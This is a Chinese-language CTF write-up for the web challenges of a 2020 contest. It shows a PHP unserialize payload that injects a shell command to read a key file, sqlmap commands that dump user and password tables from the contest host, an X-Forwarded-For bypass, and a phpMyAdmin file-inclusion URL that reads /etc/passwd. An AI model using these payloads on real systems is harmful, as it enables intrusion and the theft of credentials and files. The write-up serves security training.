---
title: 合天御宅战疫-web-wp
date: 2020-02-29
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---
# 合天御宅战疫-web-wp

## 签到

<!-- more -->

如图所示

[![mark](https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim)](https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim)

改成key{XXXX}提交

## 脑袋有点大

用bp抓包,在响应中找到key

[![mark](https://blogjpg.yanmy.top/blog/20200229/dFQYs1BGYQOz.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/dFQYs1BGYQOz.png?imageslim)

[![mark](https://blogjpg.yanmy.top/blog/20200229/IORN4qHb421z.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/IORN4qHb421z.png?imageslim)

## 统一登录

打开界面,要登陆,登录不上,用dirmap扫一下目录

[![mark](https://blogjpg.yanmy.top/blog/20200229/TskYQljtjGHy.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/TskYQljtjGHy.png?imageslim)

找到源码泄露,下载下来

代码审计

在common文件夹下找到home.php,wakeup函数有一个waf过滤,最下方的

```
$a=@$_POST['a'];
@unserialize($a);
```

可以想到构造反序列化对象,直接执行我们构造的对象,利用system函数,home后面的数字大于2可以绕过wakeup函数从而绕过过滤

构造payload

```
a=O:4:"home":3:{s:12:"%00home%00method";s:4:"ping";s:10:"%00home%00args";a:1:{i:0;s:26:"127.0.0.1;cat /opt/key.txt";}}
```

[![mark](https://blogjpg.yanmy.top/blog/20200229/Yj8LhB4w1QSC.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/Yj8LhB4w1QSC.png?imageslim)

## 后台key

[![mark](https://blogjpg.yanmy.top/blog/20200229/kX2mbF9SLn2B.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/kX2mbF9SLn2B.png?imageslim)

存在数字型sql注入

用sqlmap跑一下

爆库

```
sqlmap -u "http://118.190.100.227:5001/?r=content&cid=1"  -p "cid" --dbs
```

[![mark](https://blogjpg.yanmy.top/blog/20200229/BE5Um90VnzOE.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/BE5Um90VnzOE.png?imageslim)

爆表

```
sqlmap -u "http://118.190.100.227:5001/?r=content&cid=1"  -p "cid" -D seacms --tables
```

[![mark](https://blogjpg.yanmy.top/blog/20200229/hLkw8QttXHQP.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/hLkw8QttXHQP.png?imageslim)

爆字段

```
sqlmap -u "http://118.190.100.227:5001/?r=content&cid=1"  -p "cid" -D seacms -T manage --columns
```

[![mark](https://blogjpg.yanmy.top/blog/20200229/i8fCB3zOQGEY.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/i8fCB3zOQGEY.png?imageslim)

爆内容

```
sqlmap -u "http://118.190.100.227:5001/?r=content&cid=1"  -p "cid" -D seacms -T manage -C user,password --dump
```

[![mark](https://blogjpg.yanmy.top/blog/20200229/fM6cHxBQX6As.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/fM6cHxBQX6As.png?imageslim)

[![mark](https://blogjpg.yanmy.top/blog/20200229/pTU7n82U9Swj.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/pTU7n82U9Swj.png?imageslim)

得到用户名和密码后,由于密码MD5加密了,所以用md5解密一下,得到密码登录系统,根据提示找到key

[![mark](https://blogjpg.yanmy.top/blog/20200229/Ppjbm5Y8SrTk.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/Ppjbm5Y8SrTk.png?imageslim)

## 后台登录

[![mark](https://blogjpg.yanmy.top/blog/20200229/4pCgjJT5hHRV.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/4pCgjJT5hHRV.png?imageslim)

打开发现静止访问,但是响应码为200说明可能因为是后台登录系统做了限制,改xff头后顺利访问

[![mark](https://blogjpg.yanmy.top/blog/20200229/HK6RCODAJsFr.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/HK6RCODAJsFr.png?imageslim)

使用万能密码登录,成功获取key

[![mark](https://blogjpg.yanmy.top/blog/20200229/hznWs2Nj07se.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/hznWs2Nj07se.png?imageslim)

[![mark](https://blogjpg.yanmy.top/blog/20200229/F2DufvYCsrhm.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/F2DufvYCsrhm.png?imageslim)

## phpmyadmin

[![mark](https://blogjpg.yanmy.top/blog/20200229/MybinCxjXJSb.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/MybinCxjXJSb.png?imageslim)

根目录下面的robots.txt指明了key的位置

通过增加常用文件名phpmyadmin,成功找到登录地址

用弱口令root/root登录后,先尝试包含/etc/passwd判断目录层级

```
http://114.215.40.251:5002/phpmyadmin/index.php?a=phpinfo();&target=export.php%253f/../../../../../etc/passwd
```

[![mark](https://blogjpg.yanmy.top/blog/20200229/V7A676OjqiFP.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/V7A676OjqiFP.png?imageslim)

然后再去包含key

```
http://114.215.40.251:5002/phpmyadmin/index.php?a=phpinfo();&target=export.php%253f/../../../../../opt/key.txt
```

[![mark](https://blogjpg.yanmy.top/blog/20200229/5KWYUpGJCx4T.png?imageslim)](https://blogjpg.yanmy.top/blog/20200229/5KWYUpGJCx4T.png?imageslim)